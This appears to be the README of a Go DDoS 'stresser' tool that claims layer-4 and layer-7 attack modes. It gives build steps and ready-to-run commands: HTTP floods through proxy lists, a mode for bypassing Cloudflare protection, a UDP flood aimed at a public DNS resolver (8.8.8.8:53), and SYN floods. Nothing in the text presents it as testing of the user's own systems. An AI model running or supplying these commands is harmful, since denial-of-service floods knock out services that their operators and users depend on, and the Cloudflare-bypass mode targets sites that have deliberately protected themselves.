# stresser-v3
full l4 and l7


## How to run it:
```bash

cd stresser
go mod tidy
go build -o stresser
```

## L7 examples:
```bash

./stresser -m http -t https://target.com -p proxies.txt -th 600 -d 40
./stresser -m bypass -t https://cf-protected.site -th 400

```
## L4 examples:
```bash

./stresser -m udp -t 8.8.8.8:53 -th 800 -d 20
./stresser -m syn -t 192.168.1.1:80 -th 500
```
